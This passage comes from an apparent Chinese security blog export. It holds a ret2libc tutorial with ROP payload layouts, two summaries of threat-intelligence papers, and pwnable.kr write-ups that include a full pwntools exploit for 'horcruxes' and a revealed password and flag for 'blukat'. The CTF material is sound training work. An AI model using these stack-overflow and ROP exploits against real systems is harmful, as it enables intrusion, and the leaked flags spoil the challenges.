class="header-anchor">#</a></h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，会选择执行 system(&quot;/bin/sh&quot;)，故而需要知道 system 函数的地址。可以分为以下三种情况：</p><ul><li>类型1：有”/bin/sh”，有system函数</li><li>类型2：没有”/bin/sh”，有system函数</li><li>类型3：没有”/bin/sh”，没有system函数</li></ul><h4><span id="plei-xing-1-you-bin-sh-you-system-han-shu">类型1：有”/bin/sh”，有system函数</span><a href="#plei-xing-1-you-bin-sh-you-system-han-shu" class="header-anchor">#</a></h4><p>分析与利用步骤：以附件中的ret2libc1文件为例</p><ol><li>checksec查看ret2libc1保护如图3.4.1所示，开启了NX保护。</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133144.jpg" alt="img"></p><center>图3.4.1 ret2libc1 保护机制</center>2. IDA查看main函数，可以看到存在栈溢出漏洞，如图3.4.2所示。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133149.jpg" alt="img"></p><center>图3.4.2 ret2libc1 main函数</center>3. 使用ROPgadget工具，在程序中能够找到/bin/sh字符串地址binsh_address，且在程序的plt表中能够找到system函数地址system_plt_address，即为第一类。<ol start="4"><li>通过栈溢出布局，由于我们知道字符串地址和system在plt表中地址，所以不需要泄露libc基址。如图3.4.3所示，覆盖返回地址为system_plt_address，并放入参数为/bin/sh地址即可。</li><li>同前，padding长度为108，构造输入为:</li></ol><p>’A’*108+p32(0xdeadbeaf)+p32(system_plt_address)+p32(0xdeadbeaf)+p32(binsh_address)</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133156.jpg" alt="img"></p><center>图3.4.3 ret2libc1 栈布局</center><h4><span id="plei-xing-2-mei-you-bin-sh-you-system-han-shu">类型2：没有”/bin/sh”，有system函数</span><a href="#plei-xing-2-mei-you-bin-sh-you-system-han-shu" class="header-anchor">#</a></h4><p>分析与利用步骤：以附件中ret2libc2文件为例</p><ol><li>checksec查看保护机制，如图3.4.4所示，只开启了NX保护</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133201.jpg" alt="img"></p><center>图3.4.4 ret2libc2 保护机制</center>2. IDA打开查看main函数，如图3.4.5所示，同样存在栈溢出漏洞。与ret2libc1不同的是，ret2libc2中不存在/bin/sh字符串，但是我们能在.bss段找到一个全局的buf2数组，长度为0x64。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133206.jpg" alt="img"></p><center>图3.4.5 ret2libc2 main函数</center>3. 由于plt表中存在gets函数地址gets_plt和system函数地址system_plt，.bss段buf2数组地址为buf2_addr。因此利用可以分为两步，首先构造执行gets(buf2_addr)将/bin/sh字符串写入全局buf2中，再执行system(buf2_addr)达到目的。<ol start="4"><li>经过上述分析，可以对栈布局如图3.4.6所示，在这里要注意，由于在程序执行中gets有一个参数，因此需要将其pop出去才能继续执行。</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133213.jpg" alt="img"></p><center>图3.4.6 ret2libc2 栈布局</center>5. 同样padding长度仍然为108，最后可以构造输入如下：<p>108*’A’+p32(0xdeadbeaf)+p32(gets_plt)+p32(pop_ebx_ret)+p32(buf2_addr)+p32(system_plt)+p32(0xdeadbeaf)+p32(buf2_addr)</p><h4><span id="plei-xing-3-mei-you-bin-sh-mei-you-system-han-shu">类型3：没有”/bin/sh”，没有system函数</span><a href="#plei-xing-3-mei-you-bin-sh-mei-you-system-han-shu" class="header-anchor">#</a></h4><p>这一类的漏洞利用思路如下：</p><ul><li><p>system函数属于<code>libc.so</code>，在libc.so中的相对偏移是固定的</p></li><li><p>即使开启了ASRL保护，也不会改变加载地址的低12位</p></li><li><p>可以通过GOT表泄露已执行过的libc.so中的函数的地址</p></li><li><p>通过泄露的低12位找到libc.so版本，得到system函数和/bin/sh地址</p></li><li><p>ROP利用<br>分析与利用步骤：以附件中的ret2libc3文件为例</p></li></ul><p>1．checksec查看ret2libc3保护机制，如图3.4.7所示，只开启了NX保护</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133219.jpg" alt="img"></p><center>图3.4.7 ret2libc3保护机制</center>2. IDA打开查看main函数，如图3.4.8所示，存在栈溢出。存在gets和puts两个libc.so中的函数<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133224.jpg" alt="img"></p><center>图3.4.8 ret2libc3 main函数</center>3. 根据之前所说的利用思路，可以想到以下利用步骤：<ul><li><p>第一次ROP：利用puts函数泄露__libc_start_main函数地址</p></li><li><p>通过低12位查找libc.so版本</p></li><li><p>得到实际的system函数和/bin/sh地址</p></li><li><p>第二次ROP：执行system(“/bin/sh”)</p></li></ul><p>这里我们需要让main函数执行两次，这样才能进行两次ROP</p><ol start="4"><li>第一次ROP栈布局如图3.4.9所示，返回时，先调用puts函数输出__libc_start_main函数地址，然后会进入第二次main函数的执行，得到了第二次ROP的机会</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133229.jpg" alt="img"></p><center>图3.4.9 ret2libc3 第一次ROP栈布局</center>5. 通过泄露的__libc_start_main函数地址，可以得到system函数地址和/bin/sh地址，从而第二次ROP栈布局如图3.4.10所示，执行system(“/bin/sh”) 。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133234.jpg" alt="img"></p><center>图3.4.10 ret2libc3 第二次ROP栈布局</center>在通过低12位查询libc.so版本时可以利用[libc版本数据库](https://github.com/niklasb/libc-database)， 以及其对于python的查询封装[LibcSearcher](https://github.com/lieanu/LibcSearcher)。]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>stack_overflow</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>stack overflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Beyond Free Riding-Quality of Indicators for Assessing Participation in Information Sharing for Threat Intelligence</title>
    <url>/7160fe1c.html</url>
    <content><![CDATA[<blockquote><p>依然是态势感知作业需求</p></blockquote><h2><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h2><p>paper针对在威胁情报共享体系中，某些参与者为了获得共享情报，却又不给出实质性的贡献的情况（所谓搭便车），提出指标质量QoI来评估参与者的贡献，并引入了以下度量：正确性、相关性、实用性和唯一性。</p><p>采用基准方法定义了质量度量，然后获得了一个参考数据集，并利用机器学习文献中的工具进行质量评估。将这些结果与仅将信息量视为贡献度量的模型进行了比较，揭示了各种有趣的观察结果，发现低质量的参与者。</p><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>在建立共享体系过程中，参与者之间也存在着竞争关系，所以有的参与者只想加入但不想有实质性的贡献。所以有了作者的这个工作</p><h3><span id="pquality-of-indicators">Quality of Indicators</span><a href="#pquality-of-indicators" class="header-anchor">#</a></h3><p>一个定义良好的QoI系统能够区分参与者的贡献度，提高社区质量。由于在社区中，并不是强制性的要求共享，全凭意愿。因此我们需要一个稳健的评价系统，而不是预先定义信任。</p><h3><span id="pthe-simple-contribution-measures">The Simple Contribution Measures</span><a href="#pthe-simple-contribution-measures" class="header-anchor">#</a></h3><p>其他论文存在这个gap,因此确定QoI来捕捉搭便车现象存在必要。</p><p>仅仅通过成员贡献的数目来衡量贡献度是不够的，在以往的文献中未提出很好的贡献质量评价标准。</p><h3><span id="pfeatures-of-quality-of-indicators">Features of Quality of Indicators</span><a href="#pfeatures-of-quality-of-indicators" class="header-anchor">#</a></h3><p>已有的文献探讨过QoI和信息私密性（独家）、正确性（准确）、与社区成员的相关性（领域）、效用、唯一性（信息是否冗余）的关系。</p><p>除了以上，也有时效性指标。单独的使用一个指标是不够的，因此在本文中对其进行加权来评价这些指标的质量。</p><h3><span id="pcontribution">Contribution</span><a href="#pcontribution" class="header-anchor">#</a></h3><p>1、结果认为，在信息共享体系中，需要QoI来分析成员的贡献</p><p>2、制定了稳健的度量指标</p><p>3、通过实验演示了指标，展示了健壮性，以及它区分搭便车行为的能力</p><h2><span id="poverview-and-preliminaries">OVERVIEW AND PRELIMINARIES</span><a href="#poverview-and-preliminaries" class="header-anchor">#</a></h2><p>首先概述了网络威胁情报系统，然后介绍了这些系统中信息共享的独特问题，为了解决这些问题，需要采取质量评估。</p><h3><span id="pthe-threat-landscape">The Threat Landscape</span><a href="#pthe-threat-landscape" class="header-anchor">#</a></h3><p>主要讲了僵尸网络的威胁</p><h3><span id="pthe-need-for-threat-intelligence">The Need for Threat Intelligence</span><a href="#pthe-need-for-threat-intelligence" class="header-anchor">#</a></h3><p>主要是为了在被攻击前发现安全威胁。类似于银行没被抢之前就找到有意图的罪犯。</p><h3><span id="pthreat-intelligence-sharing">Threat Intelligence Sharing</span><a href="#pthreat-intelligence-sharing" class="header-anchor">#</a></h3><p>随着互联网的发展，威胁的增多，单个机构的力量很难解决所有问题。</p><p>通过威胁情报的共享，可以联合防御。</p><p>为了达成情报共享，就需要定义接口啥的来进行交换。（参考文献3、4、5定义了信息共享标准）</p><h3><span id="prisks-of-sharing">Risks of Sharing</span><a href="#prisks-of-sharing" class="header-anchor">#</a></h3><p>1、威胁信息的暴露，可能会被利用于攻击</p><p>2、泄露分享者的隐私信息等</p><p>3、参与者之间存在合作和竞争关系，一手情报不愿意分享</p><h3><span id="pformulation-of-the-free-riding-problem">Formulation of the Free-Riding Problem</span><a href="#pformulation-of-the-free-riding-problem" class="header-anchor">#</a></h3><p>定义搭便车行为：一些人是为了从共享信息系统获利而不是为了贡献，不肯提供有用的内容。</p><h3><span id="phow-quality-of-indicators-help">How Quality of Indicators Help</span><a href="#phow-quality-of-indicators-help" class="header-anchor">#</a></h3><p>这小段没啥信息量</p><h2><span id="pqoi-assessment-methodology">QOI ASSESSMENT METHODOLOGY</span><a href="#pqoi-assessment-methodology" class="header-anchor">#</a></h2><p>QoI度量包括指标相对于标签特征的正确性、指标与消费社区成员的相关性、指标的实用性及其唯一性。</p><h3><span id="pqoi-metrics">QoI Metrics</span><a href="#pqoi-metrics" class="header-anchor">#</a></h3><p>4个度量：</p><ul><li>正确性</li><li>相关性</li><li>实用性</li><li>唯一性</li></ul><h3><span id="psystem-architecture-amp-design">System Architecture &amp; Design</span><a href="#psystem-architecture-amp-design" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134628.jpg" alt="image-20200417193345604"></p><p>上图是大概的共享体系模型，在其中加入一个assessor，用于计算分享的信息的质量，打分</p><p>这里假设交换的信息真实且清晰可见，使用现有的信息交换协议，提供端到端的安全保证。</p><h3><span id="psystem-setup-and-steps">System Setup and Steps</span><a href="#psystem-setup-and-steps" class="header-anchor">#</a></h3><ol><li>定义评价指标和打分程序</li><li>定义威胁和质量标签的注释。注释可以是指示威胁类型的标签，也可以是用于标识指标的质量（严重性，及时性等）或质量类型的标签。利用这些注释，将权重值分配给每个质量标签，并使用计分方法将质量标签转换为指标的数字总得分。</li><li>构建参考数据集</li><li>训练分类器</li></ol><p>给定样本，用模型预测样本的标签，与参与者提供的标签对比是否匹配，结果记录为质量批注，计算置信度</p><p>整体过程如下如所示</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134633.jpg" alt="image-20200417200338616"></p><h3><span id="pqoi-assessment-process-operation">QoI Assessment Process Operation</span><a href="#pqoi-assessment-process-operation" class="header-anchor">#</a></h3><p>训练使用有监督学习算法，整体过程包含特征选取、机器学习算法的选取、参数矫正（正则化等）、交叉验证</p><h2><span id="pqoi-assessment-procedures">QOI ASSESSMENT PROCEDURES</span><a href="#pqoi-assessment-procedures" class="header-anchor">#</a></h2><p>是对前面步骤的详细说明</p><h3><span id="preference-dataset-and-learning">Reference Dataset and Learning</span><a href="#preference-dataset-and-learning" class="header-anchor">#</a></h3><p>主要以VirusTotal作为参考，可信度高且信息量充足、其内容十分有用。</p><h3><span id="pextrapolation-and-benchmarking">Extrapolation and Benchmarking</span><a href="#pextrapolation-and-benchmarking" class="header-anchor">#</a></h3><p>在有了初始的参考后，需要考虑的是如何使用参考数据集来评估和推断指标的值和质量。在paper中使用半监督学习来解决这个问题。</p><p>分类模型：nearest centroid classifier （NCC）最近质心分类器</p><p>找了个图，大概这样</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134640.jpg" alt="image-20200417203847952"></p><h3><span id="plabeling-and-quality-scoring">Labeling and Quality Scoring</span><a href="#plabeling-and-quality-scoring" class="header-anchor">#</a></h3><p>有了分类器，然后需要参与者给出提供信息的feature和label，就能进行预测和打分了。</p><h3><span id="pcorrectness">Correctness</span><a href="#pcorrectness" class="header-anchor">#</a></h3><p>计算正确性</p><p>如果预测出来的标签和参与者提供的标签匹配，就给一个正分数，然后最后加权平均得到结果分数</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134643.jpg" alt="image-20200417210450912"></p><h3><span id="prelevance">Relevance</span><a href="#prelevance" class="header-anchor">#</a></h3><p>计算相关度</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134649.jpg" alt="image-20200417210511589"></p><p>对于公众更感兴趣的label，赋予更大的权值</p><h3><span id="putility">Utility</span><a href="#putility" class="header-anchor">#</a></h3><p>计算效用</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134652.jpg" alt="image-20200417210955028"></p><h3><span id="puniqueness">Uniqueness</span><a href="#puniqueness" class="header-anchor">#</a></h3><p>计算唯一性</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134658.jpg" alt="image-20200417211201763"></p><h3><span id="pquality-of-indicator-qoi">Quality of Indicator (QoI)</span><a href="#pquality-of-indicator-qoi" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134703.jpg" alt="image-20200417211322722"></p><h2><span id="pevaluation-and-findings">EVALUATION AND FINDINGS</span><a href="#pevaluation-and-findings" class="header-anchor">#</a></h2><p>和传统的只看数量方法进行比较</p><h3><span id="pdataset-characteristics">Dataset Characteristics</span><a href="#pdataset-characteristics" class="header-anchor">#</a></h3><p>为了突出QoI作为评估威胁情报信息共享贡献的新概念，我较了基于质量和基于数量的评分方法对AV供应商贡献的差异。为此，我们的数据集列举了在2011年年中至2013年年中的数据收集期间，向VirusTotal提交恶意软件样本（包括标签）的AV供应商</p><p>评估的一个关键目标是证明在使用基于数量的分数计算的不足，因为一个供应商可以通过提交大量关于低质量恶意软件样本的信息来获得高评级。如前所述，这可能是由于以下几个原因造成的：提交的关于某些恶意软件样本的工件不正确，样本族不准确，或者提交的关于样本的信息类型无助于识别或检测它们。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134745.jpg" alt="image-20200417211749490"></p><h3><span id="presult">Result</span><a href="#presult" class="header-anchor">#</a></h3><p>就是几个图，结论也很清楚</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134753.jpg" alt="image-20200417211951538"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134800.jpg" alt="image-20200417212004229"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134806.jpg" alt="image-20200417212012513"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134811.jpg" alt="image-20200417212021833"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134816.jpg" alt="image-20200417212031407"></p><p>可以看到有很多公司在划水23333</p><h2><span id="pgan-xiang">感想</span><a href="#pgan-xiang" class="header-anchor">#</a></h2><p>虽然这个工作得出了有意思的结论，但其实存在一些不恰当的地方，在计算特征的时候，提到了权重，看样子都是作者自定义的，不太科学，更好的方法是通过使用ground truth，利用数值化的方法来计算出来（比如一般来说，我们知道出现次数越多的label一般是人们比较感兴趣的，可以通过计算频率来算权重，代替认为指定）。</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>security_situation_awareness</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>security situation awareness</tag>
      </tags>
  </entry>
  <entry>
    <title>An analysis and classification of public information securiy data sources used in research and practice</title>
    <url>/1ffe8215.html</url>
    <content><![CDATA[<blockquote><p>课程作业，选题数据质量评价方法，所以看了这篇文章</p></blockquote><h2><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h2><p>是对当前公共信息安全数据源的分类与分析。对于信息安全数据来源多样且质量不一的情况进行研究分析，从六个维度进行分类和比较：(1) Type of information, (2) Integrability, (3) Timeliness, (4) Originality, (5) Type of Source,and (6) Trustworthiness。共收集和比较了68个公开的信息安全数据源，结果表明由于来源不同，数据异构繁多，加大了统一集成和使用的难度。</p><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>信息安全数据源：提供有关脆弱性、威胁、攻击、风险、受影响资产或可用对策的信息源</p><p>例如NVD、twitter的数据源等</p><p>当前研究gap：至今为止，对这些数据源的实证研究不多见，缺乏对这些数据源可用性、特征、依赖性和如何使用的系统且全面的概述。也没有对这些数据源的对比结果。</p><p>研究目标：对数据源进行分类，定性定量分析。</p><p>研究从以下三个问题入手：1、怎么分类；2、特征是什么；3、数据源之间有什么依赖关系</p><h2><span id="prelated-work">Related work</span><a href="#prelated-work" class="header-anchor">#</a></h2><ul><li>Steinberger et al. 分析现有用例，根据数据交换格式和协议，给出了结构化认识</li><li>Hernandez-Ardieta et al. 提出基于交换格式的实时信息安全数据共享模型</li><li>Rader and Wash 分析三类安全数据源：文章、网页、个人经历，发现主要内容为attack和结果</li><li>Massacci and Nguyen 分析14个漏洞库，比较信息格式</li><li>Tripathi and Singh 对几个漏洞库的漏洞分类方案进行分析，希望提出更高的分类方案</li><li>Tounsi and Rais 对不同的威胁情报类型进行了分类。关注新的标准、趋势和技术问题。</li><li>Mavroeidis and Bromander 对共享标准和策略进行分类</li><li>Zhao and White概述了信息安全数据共享的重要性，并提供了重要共享的信息安全数据类型列表。</li><li>…</li></ul><p>总结：目前的研究大多集中在信息安全数据交换或威胁情报共享方面，而对脆弱性数据库等信息安全数据源的分析研究还不多见。</p><h2><span id="presearch-methodology">Research methodology</span><a href="#presearch-methodology" class="header-anchor">#</a></h2><p>将问题2划分为很多子问题如下：</p><ul><li>2.1 数据源存在哪些特征</li><li>2.2 信息结构是什么</li><li>2.3 获取数据的接口是什么</li><li>2.4 谁提供了这些信息</li><li>2.5 信息分享的时间</li><li>2.6 提供的信息是最原始的信息吗</li></ul><p>问题3 划分：</p><ul><li>3.1 提供的不同类型的信息之间有什么关系</li><li>3.2 接口如何与提供的不同类型的信息相关？</li></ul><p>整体章节结构如下：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134610.jpg" alt="image-20200415194603766"></p><h3><span id="pliterature-review">Literature Review</span><a href="#pliterature-review" class="header-anchor">#</a></h3><p>基于snowballing方法，方法步骤如下：</p><ul><li>定义文章的起始点集合</li><li>执行snowballing迭代（包括向前snowballing，例如确定引用被检查论文的新论文，以及向后snowballing，例如查看所考虑论文的参考文献）</li></ul><p>定义起始点：通过关键字搜索各大数据库获得对应的文章（遵从snowballing的5大原则）</p><p>迭代：前向后向各进行三十次迭代直到没有新的paper进入集合，通过引用和被引等信息，经过blabla最后选出了42份优质论文</p><h3><span id="pdata-collection-on-twitter">Data collection on twitter</span><a href="#pdata-collection-on-twitter" class="header-anchor">#</a></h3><p>利用关键词，使用爬虫爬和CVE有关的tweets，pattern匹配<code>CVE-\d{4}-\d{4}</code>，（现在这个pattern已经不够用了）</p><p>一共搜集到了20160523-20180327间的709880个tweets，平均每个tweet中有0.8个url指向了包含详细信息的网页。一共有11437个不同的详细信息链接，选取了其中的top50</p><h3><span id="pexploratory-survey">Exploratory survey</span><a href="#pexploratory-survey" class="header-anchor">#</a></h3><p>调研公共安全数据源的使用，通过问卷的方式对29个大公司进行调研：What public available information security data sources are you using as input to information security risk management processes?</p><p>让他们从87个备选数据源中挑选最常用的3个，然后最后根据调研选出了32个数据源</p><h3><span id="pselection-of-information-security-data-sources">Selection of information security data sources</span><a href="#pselection-of-information-security-data-sources" class="header-anchor">#</a></h3><p>从上面的42，50，32中选取开源、英语并且和attack、risk等相关的，其他的商用、非英语什么的丢掉</p><h3><span id="pdevelopment-of-classification-taxonomy">Development of classification taxonomy</span><a href="#pdevelopment-of-classification-taxonomy" class="header-anchor">#</a></h3><p>没用的章节</p><h3><span id="pclassification-and-analysis-of-information-security-data-sources">Classification and analysis of information security data sources</span><a href="#pclassification-and-analysis-of-information-security-data-sources" class="header-anchor">#</a></h3><p>好像也没什么用，总之是为了减小个人看法对分类结果的影响，分类也是人工分的</p><h2><span id="presults">Results</span><a href="#presults" class="header-anchor">#</a></h2><h3><span id="pclassification-taxonomy">Classification taxonomy</span><a href="#pclassification-taxonomy" class="header-anchor">#</a></h3><p>分类结果如下：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134616.jpg" alt="image-20200415203957931"></p><p>根据信息类型 按照IEC2014划分为Vulnerability、Threat、Countermeasure、Attack、Risk、Asset</p><p>根据可集成性 按照IEC/ISO27005，描述了信息自动化聚集的程度，分为结构性的，非结构性的格式和接口等</p><p>根据及时性可以分为常规的日报月报和突发两种</p><p>根据独创性分为一手和二手资料</p><p>根据信息源类型分为 新闻网页、博客、安全产品网页、漏洞库、邮件、社交网络等</p><p>根据信赖程度分为 可信性、可追溯性、反馈机制</p><p>后面的东西与课程作业内容不是很相关所以就不看了，都是回答前面抛出的的questions</p><p>这六个分类维度和选题还算有点关系</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>security_situation_awareness</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>security situation awareness</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— horcruxes</title>
    <url>/62d14747.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Voldemort concealed his splitted soul inside 7 horcruxes.</span><br><span class="line">Find all horcruxes, and ROP it!</span><br><span class="line">author: jiwon choi</span><br><span class="line"></span><br><span class="line">ssh horcruxes@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>IDA打开看到ropme函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int ropme()</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; &#x2F;&#x2F; [esp+4h] [ebp-74h]</span><br><span class="line">  int v2; &#x2F;&#x2F; [esp+68h] [ebp-10h]</span><br><span class="line">  int fd; &#x2F;&#x2F; [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Select Menu:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">  getchar();</span><br><span class="line">  if ( v2 &#x3D;&#x3D; a )</span><br><span class="line">  &#123;</span><br><span class="line">    A();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; b )</span><br><span class="line">  &#123;</span><br><span class="line">    B();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; c )</span><br><span class="line">  &#123;</span><br><span class="line">    C();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; d )</span><br><span class="line">  &#123;</span><br><span class="line">    D();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; e )</span><br><span class="line">  &#123;</span><br><span class="line">    E();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; f )</span><br><span class="line">  &#123;</span><br><span class="line">    F();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; g )</span><br><span class="line">  &#123;</span><br><span class="line">    G();</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;How many EXP did you earned? : &quot;);</span><br><span class="line">    gets(s);</span><br><span class="line">    if ( atoi(s) &#x3D;&#x3D; sum )</span><br><span class="line">    &#123;</span><br><span class="line">      fd &#x3D; open(&quot;flag&quot;, 0);</span><br><span class="line">      s[read(fd, s, 0x64u)] &#x3D; 0;</span><br><span class="line">      puts(s);</span><br><span class="line">      close(fd);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;You&#39;d better get more experience to kill Voldemort&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在gets中存在栈溢出，题目是要知道A+B+C+D+E+F+G的值，等于sum即可，所以我们只要通过ROP，分别执行A、B、C、D、E、F、G，最后再执行ropme，输入sum</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; process(&#39;horcruxes&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;horcruxes&#39;)</span><br><span class="line">A &#x3D; elf.symbols[&#39;A&#39;]</span><br><span class="line">B &#x3D; elf.symbols[&#39;B&#39;]</span><br><span class="line">C &#x3D; elf.symbols[&#39;C&#39;]</span><br><span class="line">D &#x3D; elf.symbols[&#39;D&#39;]</span><br><span class="line">E &#x3D; elf.symbols[&#39;E&#39;]</span><br><span class="line">F &#x3D; elf.symbols[&#39;F&#39;]</span><br><span class="line">G &#x3D; elf.symbols[&#39;G&#39;]</span><br><span class="line">ropme &#x3D; elf.symbols[&#39;ropme&#39;]</span><br><span class="line">ropme &#x3D; 0x809fffc</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x74+4)</span><br><span class="line">payload +&#x3D; p32(A)+p32(B)+p32(C)+p32(D)+p32(E)+p32(F)+p32(G)+p32(ropme)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">import  time</span><br><span class="line">time.sleep(1)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">result &#x3D; p.recv().split(&#39;\n&#39;)[4:11]</span><br><span class="line">total &#x3D; 0</span><br><span class="line">for line in result:</span><br><span class="line">    line &#x3D; line.split(&#39;+&#39;)[1].split(&#39;)&#39;)[0]</span><br><span class="line">    print line</span><br><span class="line">    total+&#x3D;eval(line)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(total))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— blukat</title>
    <url>/df231074.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sometimes, pwnable is strange...</span><br><span class="line">hint: if this challenge is hard, you are a skilled player.</span><br><span class="line"></span><br><span class="line">ssh blukat@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>调试了下看到了password，输入就行了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x6010a0 &lt;password&gt;:    0x736170203a746163      0x50203a64726f7773</span><br><span class="line">0x6010b0 &lt;password+16&gt;: 0x6f697373696d7265      0x6465696e6564206e</span><br></pre></td></tr></table></figure><p>密码是 <code>cat: password: Permission denied</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">blukat@prowl:~$ ./blukat</span><br><span class="line">guess the password!</span><br><span class="line">cat: password: Permission denied</span><br><span class="line">congrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— unlink</title>
    <url>/9f35ac76.html</url>
